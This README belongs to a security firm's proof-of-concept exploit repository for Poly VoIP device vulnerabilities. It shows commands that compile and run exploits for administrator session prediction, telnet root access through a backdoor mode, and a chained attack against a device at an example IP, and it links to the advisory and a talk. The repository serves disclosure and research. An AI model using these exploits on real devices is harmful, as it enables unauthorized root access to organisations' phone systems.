# [MZ-23-01] Poly VoIP Devices

Proof of Concept exploits for vulnerabilities affecting Poly VoIP devices.

A detailed security advisory, including these and other vulnerabilities in Poly VoIP devices, is available at https://modzero.com/en/advisories/mz-23-01-poly-voip/

A beginner-friendly talk about these vulnerabilities and how such vulnerabliities can be found is availabe at https://media.ccc.de/v/37c3-11919-finding_vulnerabilities_in_internet-connected_devices

### CVE-2023-4462: Administrator Session Prediction  
```
# compile it yourself
cd src
gcc -Wall -o poc poc-rand.c
./poc CCX 12345678
# or use the precompiled version
cd bin
./poc-rand CCX 12345678
```

### CVE-2023-4467: Backdoor-Mode Allows Telnet Root Access  
```
# compile it yourself
cd src
gcc -Wall -o poc poc-ta.c -lssl -lcrypto
./poc 123456ffffff 425813540719
# or use the precompiled version
cd bin
./poc-ta 123456ffffff 425813540719
```

### Attack Chain From Our Demo (CVE-2023-4462, CVE-2023-4464, CVE-2023-4465)
```
cd demo
python3 poc.py --device TRIO8800 10.10.10.10
```
## Contact

If you have any questions, don't hesitate to contact us directly.

* [yonk @ mastodon](https://chaos.social/@yonk "yonk on mastodon")
* [parzel @ twitter](https://twitter.com/parzel2 "parzel on twitter")
* [modzero home](https://www.modzero.com "modzero")
* [modzero @ twitter](https://twitter.com/mod0 "modzero on twitter")
* [modzero @ github](https://github.com/modzero/ "modzero on github")